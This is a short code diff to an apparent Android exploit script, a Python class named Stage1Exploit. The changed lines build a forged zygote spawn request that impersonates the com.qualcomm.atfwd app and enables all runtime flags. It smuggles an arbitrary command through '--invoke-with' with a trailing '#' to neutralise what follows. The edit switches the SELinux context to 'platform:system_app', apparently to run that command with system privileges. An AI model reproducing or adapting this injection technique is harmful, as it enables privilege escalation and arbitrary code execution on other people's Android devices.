@@ -196,7 +196,7 @@ class Stage1Exploit:
             "--nice-name=com.qualcomm.atfwd",
             "--app-data-dir=/data/user/0/com.qualcomm.atfwd",
             "--runtime-args",
-            "--seinfo=sysmonappapp:sysmonapp_app:complete",
+            "--seinfo=platform:system_app:complete",
             "--runtime-flags=32767",
             "--invoke-with",
             f"{command}#",
